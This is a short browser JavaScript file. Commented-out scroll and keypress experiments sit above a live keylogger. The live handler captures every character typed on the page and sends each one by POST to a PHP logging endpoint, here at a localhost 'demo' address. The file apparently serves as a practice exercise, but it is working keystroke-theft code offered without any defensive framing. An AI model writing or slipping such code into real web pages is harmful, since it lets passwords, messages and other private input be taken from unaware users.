// on scroll down hide the element with class name link2
/*
const newLocal = document.getElementsByClassName('link2');
var scrollE = newLocal


window.addEventListener('scroll', e => {
    if (e.returnValue == true) {
        console.log('scrolled')
        scrollE.style.display = 'none';
    }
    console.log(e)
});


window.addEventListener('keypress', e => {

    console.log(e)
});

 var key = '';

 document.onkeypress = function(e) {
    var get = window.event?event:e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    key += key;
    console.log(key)
}
*/


document.onkeypress = function (evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if(key){
        var http = new XMLHttpRequest();
        var param = encodeURI(key)
        http.open("POST","http://127.0.0.1/demo/logs.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("key="+param);
    }
    
}